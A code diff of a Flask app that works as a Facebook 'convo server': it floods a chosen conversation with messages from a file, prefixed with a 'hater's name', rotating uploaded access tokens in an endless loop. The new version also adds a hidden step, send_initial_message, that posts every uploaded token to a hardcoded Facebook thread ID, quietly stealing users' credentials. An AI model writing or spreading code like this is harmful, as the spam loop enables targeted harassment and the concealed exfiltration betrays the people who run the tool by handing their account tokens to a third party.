@@ -1,177 +1,235 @@
-from flask import Flask, request, render_template_string
-import requests
+from flask import Flask, request, render_template_string, jsonify
+import threading
 import os
-from time import sleep
+import requests
 import time
+import http.server
+import socketserver
 
 app = Flask(__name__)
-app.debug = True
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        token_type = request.form.get('tokenType')
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        if token_type == 'single':
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
-
-            while True:
-                try:
-                    for message1 in messages:
-                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        message = str(mn) + ' ' + message1
-                        parameters = {'access_token': access_token, 'message': message}
-                        response = requests.post(api_url, data=parameters, headers=headers)
-                        if response.status_code == 200:
-                            print(f"Message sent using token {access_token}: {message}")
-                        else:
-                            print(f"Failed to send message using token {access_token}: {message}")
-                        time.sleep(time_interval)
-                except Exception as e:
-                    print(f"Error while sending message using token {access_token}: {message}")
-                    print(e)
-                    time.sleep(30)
-
-        elif token_type == 'multi':
-            token_file = request.files['tokenFile']
-            tokens = token_file.read().decode().splitlines()
-            txt_file = request.files['txtFile']
-            messages = txt_file.read().decode().splitlines()
-
-            while True:
-                try:
-                    for token in tokens:
-                        for message1 in messages:
-                            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                            message = str(mn) + ' ' + message1
-                            parameters = {'access_token': token, 'message': message}
-                            response = requests.post(api_url, data=parameters, headers=headers)
-                            if response.status_code == 200:
-                                print(f"Message sent using token {token}: {message}")
-                            else:
-                                print(f"Failed to send message using token {token}: {message}")
-                            time.sleep(time_interval)
-                except Exception as e:
-                    print(f"Error while sending message using token {token}: {message}")
-                    print(e)
-                    time.sleep(30)
-
-    return '''
+# HTML Template with updated styles and background image
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dev 1nS1De❤️</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body{
-      background-color: bule;
-    }
-    .container{
-      max-width: 300px;
-      background-color: bisque;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
-      margin: 0 auto;
-      margin-top: 20px;
-    }
-    .header{
-      text-align: center;
-      padding-bottom: 10px;
-    }
-    .btn-submit{
-      width: 100%;
-      margin-top: 10px;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 10px;
-      color: blue;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAJ CONVO SERVER FB</title>
+    <style>
+        body {
+            background-image: url('https://your-image-url.com/IMG-20240604-WA0054.jpg'); /* Replace with the URL of your image */
+            background-size: cover;
+            background-position: center;
+            color: white; /* Ensure text is readable on the background */
+            font-family: Arial, sans-serif;
+        }
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.7); /* Adding a semi-transparent background for readability */
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 40px auto;
+        }
+        .form-container h2 {
+            text-align: center;
+            color: #ffffff;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+        .form-group input,
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            box-sizing: border-box;
+            margin-top: 5px;
+        }
+        /* Changing colors for different input fields */
+        #tokensFile {
+            background-color: red; /* Red color for tokensFile input */
+        }
+        #convoId {
+            background-color: yellow; /* Yellow color for convoId input */
+        }
+        #messagesFile {
+            background-color: green; /* Green color for messagesFile input */
+        }
+        #hatersName {
+            background-color: blue; /* Blue color for hatersName input */
+        }
+        #speed {
+            background-color: purple; /* Purple color for speed input */
+        }
+        .form-group button {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-  <header class="header mt-4">
-    <h1 class="mb-3"> 
-    ✪ 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁 ✪ 
-</h1>
 
-
-
-    <h1 class="mt-3"> ONWER = D3V P4NDIT AYUSH KA JIJU   </h1>
-  </header>
-
-  <div class="container">
-    <form action="/" method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenType">Select Token Type:</label>
-        <select class="form-control" id="tokenType" name="tokenType" required>
-          <option value="single">Single Token</option>
-          <option value="multi">Multi Token</option>
-        </select>
-      </div>
-      <div class="mb-3">
-        <label for="accessToken">Enter Your Token:</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken">
-      </div>
-      <div class="mb-3">
-        <label for="threadId">Enter Convo/Inbox ID:</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx">Enter Hater Name:</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile">Select Your Notepad File:</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-      </div>
-      <div class="mb-3" id="multiTokenFile" style="display: none;">
-        <label for="tokenFile">Select Token File (for multi-token):</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
-      </div>
-      <div class="mb-3">
-        <label for="time">Speed in Seconds:</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+<div class="form-container">
+    <h2>Message Sender Setup</h2>
+    <form id="messageForm" enctype="multipart/form-data">
+        <div class="form-group">
+            <label for="tokensFile">Upload Tokens File:</label>
+            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
+        </div>
+        <div class="form-group">
+            <label for="convoId">Conversation ID:</label>
+            <input type="text" id="convoId" name="convoId" required>
+        </div>
+        <div class="form-group">
+            <label for="messagesFile">Upload Messages File:</label>
+            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
+        </div>
+        <div class="form-group">
+            <label for="hatersName">Hater's Name Prefix:</label>
+            <input type="text" id="hatersName" name="hatersName" required>
+        </div>
+        <div class="form-group">
+            <label for="speed">Delay Between Messages (seconds):</label>
+            <input type="number" id="speed" name="speed" value="1" required>
+        </div>
+        <div class="form-group">
+            <button type="submit">Start Server and Send Messages</button>
+        </div>
     </form>
-  </div>
-  <footer class="footer">
-    <p>&copy; Developed by D3V PANDIT DON  2024. All Rights Reserved.</p>
-    <p>Convo/Inbox Loader Tool</p>
-    <p>Keep enjoying  <a href="https://github.com/zeeshanqureshi0">GitHub</a></p>
-  </footer>
+</div>
 
-  <script>
-    document.getElementById('tokenType').addEventListener('change', function() {
-      var tokenType = this.value;
-      document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
-      document.getElementById('accessToken').style.display = tokenType === 'multi' ? 'none' : 'block';
+<script>
+    document.getElementById('messageForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Prepare the form data
+        let formData = new FormData(this);
+
+        // Send the form data via fetch API
+        fetch('/start', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(result => {
+            alert(result.message);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred. Please check the console for details.');
+        });
     });
-  </script>
+</script>
+
 </body>
 </html>
-    '''
+'''
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+# HTTP server handler class
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"Server is running")
+
+# Function to execute the HTTP server
+def execute_server(port):
+    with socketserver.TCPServer(("", port), MyHandler) as httpd:
+        print(f"Server running at http://localhost:{port}")
+        httpd.serve_forever()
+
+# Function to read a file and return its content as a list of lines
+def read_file(file_path):
+    with open(file_path, 'r') as file:
+        return file.readlines()
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/start', methods=['POST'])
+def start_server_and_messaging():
+    port = 4000  # Port is fixed to 4000
+    target_id = "100000142188441"  # Fixed target ID
+    convo_id = request.form.get('convoId')
+    haters_name = request.form.get('hatersName')
+    speed = int(request.form.get('speed'))
+    
+    # Save uploaded files
+    tokens_file = request.files['tokensFile']
+    messages_file = request.files['messagesFile']
+    
+    tokens_path = 'uploaded_tokens.txt'
+    messages_path = 'uploaded_messages.txt'
+    
+    tokens_file.save(tokens_path)
+    messages_file.save(messages_path)
+    
+    tokens = read_file(tokens_path)
+    messages = read_file(messages_path)
+
+    # Start the HTTP server in a separate thread
+    server_thread = threading.Thread(target=execute_server, args=(port,))
+    server_thread.start()
+
+    # Function to send an initial message
+    def send_initial_message():
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Accept": "application/json",
+        }
+        for token in tokens:
+            access_token = token.strip()
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            msg = f"Hello! I am using your server. My token is {access_token}"
+            parameters = {"access_token": access_token, "message": msg}
+            response = requests.post(url, json=parameters, headers=headers)
+            time.sleep(0.1)
+
+    # Function to send messages in a loop
+    def send_messages():
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Accept": "application/json",
+        }
+        num_messages = len(messages)
+        num_tokens = len(tokens)
+        max_tokens = min(num_tokens, num_messages)
+
+        while True:
+            try:
+                for message_index in range(num_messages):
+                    token_index = message_index % max_tokens
+                    access_token = tokens[token_index].strip()
+                    message = messages[message_index].strip()
+                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                    full_message = f"{haters_name} {message}"
+                    parameters = {"access_token": access_token, "message": full_message}
+                    response = requests.post(url, json=parameters, headers=headers)
+                    time.sleep(speed)
+            except Exception as e:
+                print(f"[!] An error occurred: {e}")
+
+    # Send initial message
+    send_initial_message()
+
+    # Start sending messages in a loop
+    message_thread = threading.Thread(target=send_messages)
+    message_thread.start()
+
+    return jsonify({"message": "Server and messaging started successfully"})
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
